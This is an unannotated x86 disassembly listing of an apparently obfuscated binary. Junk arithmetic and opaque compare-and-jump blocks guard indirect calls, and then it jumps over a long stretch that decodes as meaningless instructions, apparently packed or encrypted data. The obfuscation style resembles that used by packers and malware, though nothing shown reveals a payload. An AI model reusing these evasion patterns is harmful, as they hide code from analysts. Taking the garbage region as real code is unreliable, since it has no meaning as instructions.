  41b5fd:	mov    ecx,DWORD PTR [ebp-0xb8]
  41b603:	mov    eax,0x584
  41b608:	xor    edx,edx
  41b60a:	div    ecx
  41b60c:	cmp    DWORD PTR ds:0x4284f1,0x0
  41b613:	mov    DWORD PTR ds:0x428355,0x2b7a
  41b61d:	mov    DWORD PTR ds:0x42853d,0x6434
  41b627:	mov    DWORD PTR ds:0x4284c5,0x53bf
  41b631:	jmp    0x41b6a4
  41b636:	mov    DWORD PTR ds:0x428435,edi
  41b63c:	movzx  ecx,WORD PTR ds:0x428351
  41b643:	cmp    DWORD PTR ds:0x4284f1,0x0
  41b64a:	jle    0x41b684
  41b650:	push   0x42841d
  41b655:	push   0x428459
  41b65a:	push   0x4283f5
  41b65f:	call   DWORD PTR ds:0x42e294
  41b665:	xor    DWORD PTR ds:0x4284d5,edi
  41b66b:	movzx  ecx,BYTE PTR ds:0x428331
  41b672:	sub    ecx,DWORD PTR ds:0x428439
  41b678:	mov    DWORD PTR ds:0x428331,ecx
  41b67e:	adc    DWORD PTR ds:0x428431,ecx
  41b684:	adc    ecx,0x4862
  41b68a:	and    ecx,DWORD PTR ds:0x428431
  41b690:	or     DWORD PTR ds:0x4284d5,ecx
  41b696:	mov    ecx,DWORD PTR ds:0x4284b1
  41b69c:	mov    ecx,DWORD PTR [ecx]
  41b69e:	sub    DWORD PTR ds:0x428459,ecx
  41b6a4:	imul   eax,eax,0x51d4
  41b6aa:	sub    ecx,0x11f6
  41b6b0:	mov    ecx,DWORD PTR [ebp-0xbc]
  41b6b6:	add    DWORD PTR ds:0x42841d,0x5690
  41b6c0:	xor    eax,ecx
  41b6c2:	adc    DWORD PTR ds:0x428555,edi
  41b6c8:	and    eax,0x4c09
  41b6cd:	sbb    ecx,0x3053
  41b6d3:	mov    ecx,DWORD PTR [ebp-0x50]
  41b6d6:	sub    DWORD PTR ds:0x428419,0x428469
  41b6e0:	xor    edx,edx
  41b6e2:	div    ecx
  41b6e4:	sbb    ecx,DWORD PTR ds:0x428415
  41b6ea:	sub    eax,0x401
  41b6ef:	mov    ecx,DWORD PTR ds:0x4284f1
  41b6f5:	sub    DWORD PTR ds:0x428561,ecx
  41b6fb:	mov    DWORD PTR [ebp-0x90],eax
  41b701:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41b70b:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41b712:	cmp    DWORD PTR ds:0x428465,0x0
  41b719:	mov    DWORD PTR ds:0x428349,0x12e0
  41b723:	movzx  edx,WORD PTR ds:0x428429
  41b72a:	jmp    0x41b78a
  41b72f:	not    eax
  41b731:	mov    DWORD PTR ds:0x4284c5,edi
  41b737:	cmp    DWORD PTR ds:0x428465,0x0
  41b73e:	jne    0x41b768
  41b744:	push   0x428147
  41b749:	call   DWORD PTR ds:0x42e298
  41b74f:	movzx  edx,WORD PTR ds:0x42833d
  41b756:	xor    DWORD PTR ds:0x428321,edx
  41b75c:	and    ecx,0x442f
  41b762:	sub    edx,0x55c5
  41b768:	mov    ecx,DWORD PTR ds:0x4284cd
  41b76e:	xor    ecx,DWORD PTR ds:0x4284d5
  41b774:	mov    DWORD PTR ds:0x4284cd,ecx
  41b77a:	and    DWORD PTR ds:0x42834d,0x34b7
  41b784:	adc    DWORD PTR ds:0x4284f1,ebx
  41b78a:	mov    DWORD PTR [ebp-0xb4],0x3842
  41b794:	adc    ecx,edx
  41b796:	mov    eax,DWORD PTR [ebp-0x4c]
  41b799:	and    ecx,edx
  41b79b:	add    eax,DWORD PTR [ebp-0xb4]
  41b7a1:	xor    eax,0x2e02
  41b7a6:	add    ecx,ecx
  41b7a8:	xor    eax,0x7294
  41b7ad:	add    ecx,ecx
  41b7af:	imul   eax,eax,0x68f3
  41b7b5:	mov    ecx,DWORD PTR [ebp-0x8c]
  41b7bb:	cmp    DWORD PTR ds:0x428351,0x0
  41b7c2:	mov    DWORD PTR ds:0x428459,ebx
  41b7c8:	mov    edx,DWORD PTR ds:0x42856d
  41b7ce:	jmp    0x41b822
  41b7d3:	mov    DWORD PTR ds:0x428345,edx
  41b7d9:	cmp    DWORD PTR ds:0x428351,0x0
  41b7e0:	ja     0x41b810
  41b7e6:	push   DWORD PTR [ebp-0x1c]
  41b7e9:	push   0x2a61
  41b7ee:	push   0x6c90
  41b7f3:	push   0x2be6
  41b7f8:	push   0x2810
  41b7fd:	call   DWORD PTR ds:0x42e054
  41b803:	inc    edx
  41b804:	mov    edx,DWORD PTR ds:0x428341
  41b80a:	sbb    DWORD PTR ds:0x428449,edx
  41b810:	or     edx,DWORD PTR ds:0x428361
  41b816:	and    edx,DWORD PTR ds:0x4284c5
  41b81c:	sub    edx,DWORD PTR ds:0x428559
  41b822:	and    eax,ecx
  41b824:	adc    DWORD PTR ds:0x42845d,0x2bc9
  41b82e:	sub    eax,0x2818
  41b833:	mov    edx,DWORD PTR ds:0x42850d
  41b839:	mov    ecx,DWORD PTR ds:0x428519
  41b83f:	sub    ecx,edx
  41b841:	add    edx,DWORD PTR [edx+ecx*1]
  41b844:	mov    DWORD PTR [ebp-0xe8],eax
  41b84a:	mov    DWORD PTR [ebp-0x70],0x6f89
  41b851:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41b85b:	mov    DWORD PTR [ebp-0x120],0x3c77
  41b865:	sbb    DWORD PTR ds:0x428419,edx
  41b86b:	mov    DWORD PTR [ebp-0x2c],0x2129
  41b872:	cmp    DWORD PTR ds:0x428471,0x0
  41b879:	mov    DWORD PTR ds:0x428365,0x25cb
  41b883:	mov    edx,0x2db2
  41b888:	mov    DWORD PTR ds:0x4284f1,0x75fd
  41b892:	jmp    0x41b8de
  41b897:	mov    eax,0x420d
  41b89c:	mov    DWORD PTR ds:0x4284cd,0x38f0
  41b8a6:	cmp    DWORD PTR ds:0x428471,0x0
  41b8ad:	jge    0x41b8c8
  41b8b3:	push   DWORD PTR [ebp-0xc]
  41b8b6:	call   DWORD PTR ds:0x42e058
  41b8bc:	adc    DWORD PTR ds:0x42853d,edx
  41b8c2:	add    DWORD PTR ds:0x428561,edx
  41b8c8:	sbb    edx,DWORD PTR ds:0x428555
  41b8ce:	and    DWORD PTR ds:0x4284bd,0x10d1
  41b8d8:	and    ecx,0x7be2
  41b8de:	mov    eax,DWORD PTR [ebp-0x2c]
  41b8e1:	imul   eax,eax,0x1ada
  41b8e7:	xor    DWORD PTR ds:0x428459,ebx
  41b8ed:	mov    ecx,DWORD PTR [ebp-0x120]
  41b8f3:	mov    edx,DWORD PTR ds:0x428405
  41b8f9:	or     edx,DWORD PTR ds:0x428451
  41b8ff:	mov    DWORD PTR ds:0x428405,edx
  41b905:	imul   ecx,ecx,0x53ae
  41b90b:	xor    DWORD PTR ds:0x4284c5,0x220b
  41b915:	imul   ecx,ecx,0x7447
  41b91b:	mov    edx,DWORD PTR [ebp-0xd0]
  41b921:	and    ecx,edx
  41b923:	or     ecx,0x2a20
  41b929:	or     DWORD PTR ds:0x4284c5,0x6762
  41b933:	mov    edx,DWORD PTR [ebp-0x70]
  41b936:	xor    ecx,edx
  41b938:	and    DWORD PTR ds:0x42832d,0x71f
  41b942:	mov    edx,DWORD PTR [ebp+0x14]
  41b945:	or     DWORD PTR ds:0x428441,0x17f4
  41b94f:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41b956:	or     DWORD PTR ds:0x4284e1,0x428471
  41b960:	lea    eax,[ecx+eax*1-0x45a1]
  41b967:	mov    DWORD PTR [ebp-0xb0],eax
  41b96d:	add    ecx,eax
  41b96f:	mov    DWORD PTR [ebp-0x11c],0x303f
  41b979:	mov    DWORD PTR [ebp-0x98],0x51a9
  41b983:	sub    ecx,eax
  41b985:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41b98f:	cmp    DWORD PTR ds:0x428365,0x0
  41b996:	mov    DWORD PTR ds:0x428349,0x245f
  41b9a0:	mov    ecx,DWORD PTR ds:0x42841d
  41b9a6:	mov    ecx,0x273f
  41b9ab:	jmp    0x41ba0f
  41b9b0:	mov    DWORD PTR ds:0x428459,ebx
  41b9b6:	mov    DWORD PTR ds:0x428429,0x963
  41b9c0:	cmp    DWORD PTR ds:0x428365,0x0
  41b9c7:	jle    0x41b9ee
  41b9cd:	push   DWORD PTR [ebp-0x28]
  41b9d0:	push   0x4284bd
  41b9d5:	push   0x4281a5
  41b9da:	call   DWORD PTR ds:0x42e29c
  41b9e0:	sub    DWORD PTR ds:0x42854d,ebx
  41b9e6:	xor    ecx,ecx
  41b9e8:	sbb    DWORD PTR ds:0x4284d5,ebx
  41b9ee:	movzx  ecx,BYTE PTR ds:0x42834d
  41b9f5:	adc    DWORD PTR ds:0x428439,ecx
  41b9fb:	add    DWORD PTR ds:0x428341,0x7cea
  41ba05:	sbb    DWORD PTR ds:0x428345,0x6b1e
  41ba0f:	mov    eax,DWORD PTR [ebp-0xcc]
  41ba15:	xor    eax,0x6f65
  41ba1a:	cmp    DWORD PTR ds:0x42833d,0x0
  41ba21:	mov    DWORD PTR ds:0x428435,edx
  41ba27:	mov    ecx,0x51b5
  41ba2c:	jmp    0x41baa2
  41ba31:	mov    DWORD PTR ds:0x42843d,0xb0f
  41ba3b:	cmp    DWORD PTR ds:0x42833d,0x0
  41ba42:	jl     0x41ba7a
  41ba48:	push   0x200e
  41ba4d:	push   0x21c1
  41ba52:	push   DWORD PTR [ebp-0x14]
  41ba55:	push   DWORD PTR [ebp-0x14]
  41ba58:	call   DWORD PTR ds:0x42e110
  41ba5e:	sub    DWORD PTR ds:0x428409,ecx
  41ba64:	sub    ecx,DWORD PTR ds:0x428535
  41ba6a:	sbb    DWORD PTR ds:0x428411,0x4284ed
  41ba74:	sub    ecx,0x1dd7
  41ba7a:	mov    ecx,DWORD PTR ds:0x428455
  41ba80:	adc    ecx,DWORD PTR ds:0x428569
  41ba86:	mov    DWORD PTR ds:0x428455,ecx
  41ba8c:	adc    DWORD PTR ds:0x428559,0x3dd1
  41ba96:	mov    DWORD PTR ds:0x428359,0x5b91
  41baa0:	neg    ecx
  41baa2:	mov    ecx,DWORD PTR [ebp-0x98]
  41baa8:	add    DWORD PTR ds:0x428565,0x72a
  41bab2:	or     eax,ecx
  41bab4:	xor    DWORD PTR ds:0x428459,ebx
  41baba:	add    eax,0x161e
  41babf:	sub    ecx,0x1ef7
  41bac5:	mov    ecx,DWORD PTR [ebp-0x11c]
  41bacb:	or     eax,ecx
  41bacd:	cmp    DWORD PTR ds:0x428409,0x0
  41bad4:	mov    ecx,DWORD PTR ds:0x428421
  41bada:	mov    DWORD PTR ds:0x428445,0x4d
  41bae4:	jmp    0x41bbad
  41bae9:	mov    DWORD PTR ds:0x428445,0x133b
  41baf3:	cmp    DWORD PTR ds:0x428409,0x0
  41bafa:	jne    0x41bb25
  41bb00:	push   0x428551
  41bb05:	push   0x8a51
  41bb0a:	push   0x81dc
  41bb0f:	call   DWORD PTR ds:0x42e05c
  41bb15:	and    DWORD PTR ds:0x42841d,0x4030
  41bb1f:	sub    DWORD PTR ds:0x4284c9,edx
  41bb25:	add    ecx,0x753f
  41bb2b:	mov    ecx,DWORD PTR ds:0x428405
  41bb31:	xor    DWORD PTR ds:0x428401,ecx
  41bb37:	sbb    DWORD PTR ds:0x42854d,edx
  41bb3d:	cmp    DWORD PTR ds:0x428561,0x0
  41bb44:	mov    ecx,DWORD PTR ds:0x428565
  41bb4a:	mov    ecx,DWORD PTR ds:0x4284e1
  41bb50:	mov    DWORD PTR ds:0x42845d,edx
  41bb56:	mov    DWORD PTR ds:0x428415,edi
  41bb5c:	jmp    0x41bbad
  41bb61:	not    ecx
  41bb63:	cmp    DWORD PTR ds:0x428561,0x0
  41bb6a:	jne    0x41bb96
  41bb70:	push   0x6108
  41bb75:	push   0x2ee0
  41bb7a:	push   0x428285
  41bb7f:	push   0x1382
  41bb84:	call   DWORD PTR ds:0x42e060
  41bb8a:	or     DWORD PTR ds:0x4284b9,edi
  41bb90:	neg    DWORD PTR ds:0x428345
  41bb96:	movzx  ecx,WORD PTR ds:0x428549
  41bb9d:	sbb    DWORD PTR ds:0x428461,ecx
  41bba3:	or     DWORD PTR ds:0x428435,0x428441
  41bbad:	add    eax,0x1cca
  41bbb2:	cmp    DWORD PTR ds:0x428341,0x0
  41bbb9:	mov    DWORD PTR ds:0x428441,0x3c56
  41bbc3:	mov    ecx,0x7f6d
  41bbc8:	mov    ecx,DWORD PTR ds:0x42843d
  41bbce:	jmp    0x41bc28
  41bbd3:	not    ecx
  41bbd5:	cmp    DWORD PTR ds:0x428341,0x0
  41bbdc:	jbe    0x41bc10
  41bbe2:	push   0x5de5
  41bbe7:	push   0x42826f
  41bbec:	push   0x27d6
  41bbf1:	call   DWORD PTR ds:0x42e114
  41bbf7:	movzx  ecx,BYTE PTR ds:0x428361
  41bbfe:	adc    DWORD PTR ds:0x428355,ecx
  41bc04:	sbb    ecx,0x4cc7
  41bc0a:	sbb    ecx,DWORD PTR ds:0x42843d
  41bc10:	adc    DWORD PTR ds:0x428569,ebx
  41bc16:	mov    ecx,DWORD PTR ds:0x42832d
  41bc1c:	sub    DWORD PTR ds:0x428571,ecx
  41bc22:	add    ecx,0x5653
  41bc28:	xor    eax,0x96c9
  41bc2d:	sbb    DWORD PTR ds:0x428569,0x433e
  41bc37:	mov    DWORD PTR [ebp-0x38],eax
  41bc3a:	mov    DWORD PTR [ebp-0x118],0x6083
  41bc44:	sub    DWORD PTR ds:0x42831d,0x67a3
  41bc4e:	mov    DWORD PTR [ebp-0x88],0x556
  41bc58:	or     ecx,eax
  41bc5a:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41bc64:	cmp    DWORD PTR ds:0x4284c1,0x0
  41bc6b:	mov    ecx,0x31c9
  41bc70:	mov    DWORD PTR ds:0x428569,0x1996
  41bc7a:	jmp    0x41bccd
  41bc7f:	mov    DWORD PTR ds:0x4284bd,edi
  41bc85:	cmp    DWORD PTR ds:0x4284c1,0x0
  41bc8c:	jb     0x41bcb3
  41bc92:	push   0x4282e3
  41bc97:	push   DWORD PTR [ebp-0x14]
  41bc9a:	call   DWORD PTR ds:0x42e118
  41bca0:	add    ecx,DWORD PTR ds:0x428445
  41bca6:	movzx  ecx,BYTE PTR ds:0x428469
  41bcad:	add    DWORD PTR ds:0x428355,ecx
  41bcb3:	sub    DWORD PTR ds:0x4284c5,ecx
  41bcb9:	xor    ecx,ecx
  41bcbb:	add    ecx,DWORD PTR ds:0x4283f9
  41bcc1:	or     DWORD PTR ds:0x428539,ecx
  41bcc7:	add    DWORD PTR ds:0x428401,ebx
  41bccd:	mov    eax,DWORD PTR [ebp-0x140]
  41bcd3:	add    eax,0x5af8
  41bcd8:	sbb    ecx,0x75c4
  41bcde:	mov    ecx,DWORD PTR [ebp-0x88]
  41bce4:	sub    eax,ecx
  41bce6:	mov    ecx,DWORD PTR [ebp-0x118]
  41bcec:	xor    DWORD PTR ds:0x428555,0x6d4
  41bcf6:	lea    eax,[eax+ecx*1+0x68dc]
  41bcfd:	or     eax,0x52f6
  41bd02:	cmp    DWORD PTR ds:0x428449,0x0
  41bd09:	mov    DWORD PTR ds:0x428535,0x1421
  41bd13:	mov    DWORD PTR ds:0x428471,0x487c
  41bd1d:	mov    ecx,DWORD PTR ds:0x428425
  41bd23:	jmp    0x41bd91
  41bd28:	mov    DWORD PTR ds:0x42843d,0x10ed
  41bd32:	not    ecx
  41bd34:	cmp    DWORD PTR ds:0x428449,0x0
  41bd3b:	jbe    0x41bd77
  41bd41:	push   0x8eb3
  41bd46:	call   DWORD PTR ds:0x42e11c
  41bd4c:	mov    ecx,DWORD PTR ds:0x4284c5
  41bd52:	sub    DWORD PTR ds:0x428351,ecx
  41bd58:	mov    ecx,DWORD PTR ds:0x428421
  41bd5e:	sbb    ecx,DWORD PTR ds:0x428451
  41bd64:	mov    DWORD PTR ds:0x428421,ecx
  41bd6a:	movzx  ecx,BYTE PTR ds:0x42833d
  41bd71:	or     DWORD PTR ds:0x4284b5,ecx
  41bd77:	sbb    DWORD PTR ds:0x428335,ebx
  41bd7d:	neg    ecx
  41bd7f:	mov    ecx,DWORD PTR ds:0x428345
  41bd85:	xor    ecx,DWORD PTR ds:0x4283f9
  41bd8b:	mov    DWORD PTR ds:0x428345,ecx
  41bd91:	sub    eax,0x1dbfe
  41bd96:	sbb    DWORD PTR ds:0x4284d9,ecx
  41bd9c:	mov    DWORD PTR [ebp-0xac],eax
  41bda2:	xor    DWORD PTR ds:0x42841d,ebx
  41bda8:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41bdaf:	mov    DWORD PTR [ebp-0x100],0x49f7
  41bdb9:	inc    ecx
  41bdba:	mov    eax,DWORD PTR [ebp-0x100]
  41bdc0:	movzx  ecx,BYTE PTR ds:0x428545
  41bdc7:	sub    ecx,DWORD PTR ds:0x4284b9
  41bdcd:	mov    DWORD PTR ds:0x428545,ecx
  41bdd3:	add    eax,0x7b60
  41bdd8:	sbb    ecx,0x7111
  41bdde:	imul   eax,eax,0x5ea
  41bde4:	add    DWORD PTR ds:0x428465,ecx
  41bdea:	mov    ecx,DWORD PTR [ebp-0x6c]
  41bded:	imul   eax,ecx
  41bdf0:	xor    edx,edx
  41bdf2:	adc    DWORD PTR ds:0x428401,0x2190
  41bdfc:	mov    ecx,0x3218d
  41be01:	div    ecx
  41be03:	sub    eax,0x24c1
  41be08:	sbb    ecx,0x10cc
  41be0e:	mov    DWORD PTR [ebp-0xa8],eax
  41be14:	xor    eax,eax
  41be16:	add    eax,DWORD PTR ds:0x4284cd
  41be1c:	sbb    eax,DWORD PTR ds:0x428465
  41be22:	mov    ds:0x4284cd,eax
  41be27:	mov    DWORD PTR [ebp-0x84],0x2c40
  41be31:	xor    ecx,ecx
  41be33:	or     ecx,DWORD PTR ds:0x428401
  41be39:	xor    ecx,DWORD PTR ds:0x428461
  41be3f:	mov    DWORD PTR ds:0x428401,ecx
  41be45:	mov    DWORD PTR [ebp-0x18],0x6013
  41be4c:	or     DWORD PTR ds:0x428549,ecx
  41be52:	mov    DWORD PTR [ebp-0x80],0xc
  41be59:	and    eax,eax
  41be5b:	mov    eax,DWORD PTR [ebp-0x18]
  41be5e:	and    DWORD PTR ds:0x4284b5,edi
  41be64:	mov    ecx,DWORD PTR [ebp-0x80]
  41be67:	xor    edx,edx
  41be69:	add    DWORD PTR ds:0x42835d,0x428351
  41be73:	div    ecx
  41be75:	imul   eax,eax,0x4312
  41be7b:	cmp    DWORD PTR ds:0x4284d1,0x0
  41be82:	mov    DWORD PTR ds:0x428401,0x6e4f
  41be8c:	movzx  ecx,WORD PTR ds:0x428569
  41be93:	mov    DWORD PTR ds:0x428545,edi
  41be99:	jmp    0x41befc
  41be9e:	mov    DWORD PTR ds:0x42832d,0x5f09
  41bea8:	cmp    DWORD PTR ds:0x4284d1,0x0
  41beaf:	jge    0x41bed8
  41beb5:	push   DWORD PTR [ebp-0x28]
  41beb8:	call   DWORD PTR ds:0x42e064
  41bebe:	sbb    ecx,DWORD PTR ds:0x4284bd
  41bec4:	xor    ecx,ecx
  41bec6:	xor    ecx,DWORD PTR ds:0x428421
  41becc:	sub    DWORD PTR ds:0x428355,ecx
  41bed2:	and    DWORD PTR ds:0x428429,edi
  41bed8:	xor    ecx,ecx
  41beda:	xor    ecx,DWORD PTR ds:0x428559
  41bee0:	xor    DWORD PTR ds:0x4283f5,ecx
  41bee6:	or     DWORD PTR ds:0x428435,0x15e9
  41bef0:	xor    ecx,0x6843
  41bef6:	adc    ecx,DWORD PTR ds:0x428439
  41befc:	add    eax,0x5abe
  41bf01:	mov    ecx,DWORD PTR [ebp-0x84]
  41bf07:	add    DWORD PTR ds:0x4284d1,0x428569
  41bf11:	xor    eax,ecx
  41bf13:	mov    ecx,DWORD PTR ds:0x428349
  41bf19:	and    ecx,DWORD PTR ds:0x42854d
  41bf1f:	mov    DWORD PTR ds:0x428349,ecx
  41bf25:	xor    edx,edx
  41bf27:	not    DWORD PTR ds:0x428359
  41bf2d:	mov    ecx,0x5ae
  41bf32:	div    ecx
  41bf34:	jmp    0x41c31b
  41bf39:	xchg   DWORD PTR [edi],esp
  41bf3b:	dec    eax
  41bf3c:	in     al,0x68
  41bf3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3f:	lods   al,BYTE PTR ds:[esi]
  41bf40:	stos   DWORD PTR es:[edi],eax
  41bf41:	test   BYTE PTR [ebx+eax*8+0x4a60f7cf],bh
  41bf48:	xchg   edx,eax
  41bf49:	aam    0x3b
  41bf4b:	sar    BYTE PTR [esi-0x41413bb6],0x70
  41bf52:	je     0x41bf4b
  41bf54:	fidiv  DWORD PTR [ebx]
  41bf56:	repnz test ebp,esp
  41bf59:	pushf  
  41bf5a:	cmp    ah,bh
  41bf5c:	cld    
  41bf5d:	hlt    
  41bf5e:	retf   
  41bf5f:	xchg   esi,eax
  41bf60:	or     eax,0xb7ead590
  41bf65:	aam    0xee
  41bf67:	mov    dh,0x85
  41bf69:	or     esi,DWORD PTR [eax]
  41bf6b:	aam    0x51
  41bf6d:	or     eax,0x641afa28
  41bf72:	out    0xe2,eax
  41bf74:	pop    eax
  41bf75:	int    0xfb
  41bf77:	xor    bl,al
  41bf79:	loope  0x41bf26
  41bf7b:	mov    eax,0xebbfc7ff
  41bf80:	shl    DWORD PTR [eax-0x18554e62],0x4a
  41bf87:	sbb    BYTE PTR [edx+0x57091500],dl
  41bf8d:	out    0x27,eax
  41bf8f:	lock jo 0x41bfb1
  41bf92:	cmp    BYTE PTR [eax+0x5ef7b615],dl
  41bf98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf99:	push   ebx
  41bf9a:	cmp    ebx,DWORD PTR [ecx+0x6b]
  41bf9d:	xor    ah,al
  41bf9f:	sub    al,0x94
  41bfa1:	rcr    edx,cl
  41bfa3:	clc    
  41bfa4:	ret    
  41bfa5:	loope  0x41bf58
  41bfa7:	bound  edx,QWORD PTR [ebx-0x4b]
  41bfaa:	ja     0x41bf6f
  41bfac:	fist   WORD PTR [ecx]
  41bfae:	push   esp
  41bfaf:	and    ecx,DWORD PTR [ecx]
  41bfb1:	pop    edx
  41bfb2:	rol    DWORD PTR [eax],cl
  41bfb4:	out    dx,eax
  41bfb5:	std    
  41bfb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfb7:	adc    edi,DWORD PTR [ecx]
  41bfb9:	(bad)  
  41bfba:	lea    eax,[ebx]
  41bfbc:	fsub   QWORD PTR [bx]
  41bfbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfc0:	mov    dl,0x61
  41bfc2:	stos   DWORD PTR es:[edi],eax
  41bfc3:	or     ebx,DWORD PTR [ebx+0x7fd84271]
  41bfc9:	jno    0x41bfbb
  41bfcb:	xor    ebx,DWORD PTR [esi-0x42]
  41bfce:	es daa 
  41bfd0:	adc    al,0xc2
  41bfd2:	out    0x56,al
  41bfd4:	sbb    ebx,ebx
  41bfd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfd7:	bound  edx,QWORD PTR [esi-0x1f]
  41bfda:	fcomi  st,st(3)
  41bfdc:	and    bh,BYTE PTR ds:0xde1f2afb
  41bfe2:	or     eax,0xa65140cd
  41bfe7:	fsub   DWORD PTR [ecx+edx*4]
  41bfea:	sub    al,0x79
  41bfec:	pop    edi
  41bfed:	and    BYTE PTR [edx*1-0x19520449],0x28
  41bff5:	test   BYTE PTR [ebx+0x1a],al
  41bff8:	dec    edi
  41bff9:	pop    ecx
  41bffa:	dec    eax
  41bffb:	pop    esi
  41bffc:	and    al,0xe6
  41bffe:	cwde   
  41bfff:	call   0x6c30:0xe721d13d
  41c006:	mov    BYTE PTR [eax],dl
  41c008:	cli    
  41c009:	ret    
  41c00a:	imul   ebp,ebx,0xcbd7466c
  41c010:	mov    esp,0xa1908d5e
  41c015:	in     eax,0x8d
  41c017:	shr    bx,0x3e
  41c01b:	push   ebp
  41c01c:	xlat   BYTE PTR ds:[ebx]
  41c01d:	call   0xd25aafbc
  41c022:	shl    DWORD PTR [edi],0x60
  41c025:	push   esi
  41c026:	das    
  41c027:	cmp    ah,BYTE PTR [eax-0x4c]
  41c02a:	in     al,0xb
  41c02c:	push   ss
  41c02d:	hlt    
  41c02e:	dec    eax
  41c02f:	jl     0x41c021
  41c031:	sbb    esi,DWORD PTR [ebx+0x242f0b10]
  41c037:	sbb    BYTE PTR ds:[edx+0x12],0x3a
  41c03c:	xor    dh,BYTE PTR [eax]
  41c03e:	aam    0x4
  41c040:	xor    dh,BYTE PTR [ebx-0x75e09bc]
  41c046:	arpl   di,cx
  41c048:	pusha  
  41c049:	mov    al,ds:0x4aec03b3
  41c04e:	(bad)  
  41c04f:	pushf  
  41c050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c051:	mov    ebx,0x3369c4f0
  41c056:	pop    es
  41c057:	outs   dx,BYTE PTR ds:[esi]
  41c058:	bound  esi,QWORD PTR [ebp-0x43]
  41c05b:	push   ds
  41c05c:	iret   
  41c05d:	xlat   BYTE PTR ds:[ebx]
  41c05e:	aad    0xf3
  41c060:	push   ds
  41c061:	add    DWORD PTR [edx-0x7a],0x51
  41c065:	pop    eax
  41c066:	outs   dx,DWORD PTR ds:[esi]
  41c067:	retf   0x7a9
  41c06a:	fstp   TBYTE PTR [ebp+0x64f71257]
  41c070:	loopne 0x41c07e
  41c072:	xchg   ecx,esp
  41c074:	sub    BYTE PTR [esi+0x5f],0xcb
  41c078:	cmp    ebx,ecx
  41c07a:	test   esp,eax
  41c07c:	push   0x3f82b2ce
  41c081:	add    al,0x9b
  41c083:	or     esp,DWORD PTR [edi]
  41c085:	xchg   esi,eax
  41c086:	nop
  41c087:	jecxz  0x41c01a
  41c089:	mov    dh,0x68
  41c08b:	arpl   WORD PTR [ecx-0x1e],si
  41c08e:	xor    eax,0xfb49f726
  41c093:	sbb    BYTE PTR [edi+0x1a],bl
  41c096:	sar    DWORD PTR [eax-0x655b0ecb],cl
  41c09c:	push   esp
  41c09d:	ds mov ch,0x61
  41c0a0:	fisub  DWORD PTR [eax+0x21]
  41c0a3:	mov    edx,0x6fec68b7
  41c0a8:	or     BYTE PTR [ecx+0x720aaf],ch
  41c0ae:	dec    ebx
  41c0af:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41c0b1:	add    eax,DWORD PTR [ebx+eax*2]
  41c0b4:	cmp    BYTE PTR [esi],bh
  41c0b6:	push   edi
  41c0b7:	outs   dx,DWORD PTR ds:[esi]
  41c0b8:	int3   
  41c0b9:	xchg   ecx,eax
  41c0ba:	and    al,0x79
  41c0bc:	mov    gs,ebp
  41c0be:	aas    
  41c0bf:	jg     0x41c0e8
  41c0c1:	data16 adc al,BYTE PTR [ecx+edi*1]
  41c0c5:	xor    ebp,DWORD PTR [edi+eax*8]
  41c0c8:	fisub  DWORD PTR [edx+edx*8]
  41c0cb:	mov    ds:0x75378c63,eax
  41c0d0:	rol    BYTE PTR [eax-0x41d7e3b7],cl
  41c0d6:	loopne 0x41c13a
  41c0d8:	ja     0x41c08d
  41c0da:	not    DWORD PTR [edx+0x4b]
  41c0dd:	fadd   st(4),st
  41c0df:	adc    ebx,edi
  41c0e1:	or     DWORD PTR [ecx],edi
  41c0e3:	mov    BYTE PTR [ebp+0x37036dc1],0x43
  41c0ea:	add    al,0x7
  41c0ec:	sub    al,0xad
  41c0ee:	adc    al,0x9e
  41c0f0:	add    al,0x51
  41c0f2:	test   eax,0x340a6fab
  41c0f7:	cld    
  41c0f8:	cmp    BYTE PTR [esi],bh
  41c0fa:	cli    
  41c0fb:	jo     0x41c0d2
  41c0fd:	push   cs
  41c0fe:	mov    eax,0x1f0db4ae
  41c103:	ror    DWORD PTR [eax+0x34],1
  41c106:	push   ds
  41c107:	push   edx
  41c108:	xchg   ecx,eax
  41c109:	xor    BYTE PTR [ecx],cl
  41c10b:	test   al,0xf3
  41c10d:	shr    BYTE PTR ds:0x5ab77d71,1
  41c113:	lods   eax,DWORD PTR ds:[esi]
  41c114:	retf   
  41c115:	ret    0x205
  41c118:	push   edi
  41c119:	out    0x2f,eax
  41c11b:	inc    esi
  41c11c:	jmp    0xc1fefd59
  41c121:	(bad)  
  41c122:	repnz adc edi,DWORD PTR [esi+0x7efc4ad8]
  41c129:	push   ss
  41c12a:	dec    esi
  41c12b:	xchg   esi,eax
  41c12c:	out    0x92,eax
  41c12e:	cli    
  41c12f:	pop    eax
  41c130:	jns    0x41c190
  41c132:	mov    bl,0x82
  41c134:	in     al,dx
  41c135:	mov    al,ds:0x69692071
  41c13a:	or     eax,0xee5b36c6
  41c13f:	push   es
  41c140:	mov    cl,0xf5
  41c142:	or     BYTE PTR [ebx+ecx*4],ah
  41c145:	lods   eax,DWORD PTR ds:[esi]
  41c146:	mov    dh,0x7
  41c148:	fidivr WORD PTR [esi]
  41c14a:	push   0xb8ba3585
  41c14f:	inc    ebp
  41c150:	or     eax,0xc982d6b7
  41c155:	stos   DWORD PTR es:[edi],eax
  41c156:	jg     0x41c1d7
  41c158:	out    dx,eax
  41c159:	outs   dx,BYTE PTR ds:[esi]
  41c15a:	push   ebx
  41c15b:	test   DWORD PTR [ecx-0x13],edx
  41c15e:	xchg   ebx,eax
  41c15f:	mov    esi,0x187e31b6
  41c164:	loopne 0x41c18a
  41c166:	mov    eax,ds:0xd03c9d9d
  41c16b:	lea    esi,[eax+0x4a]
  41c16e:	dec    edx
  41c16f:	ss jp  0x41c1a0
  41c172:	or     al,dl
  41c174:	xor    al,0xf2
  41c176:	sar    BYTE PTR [edx-0x2],1
  41c179:	aad    0xf
  41c17b:	test   al,0xca
  41c17d:	enter  0x88b,0xaf
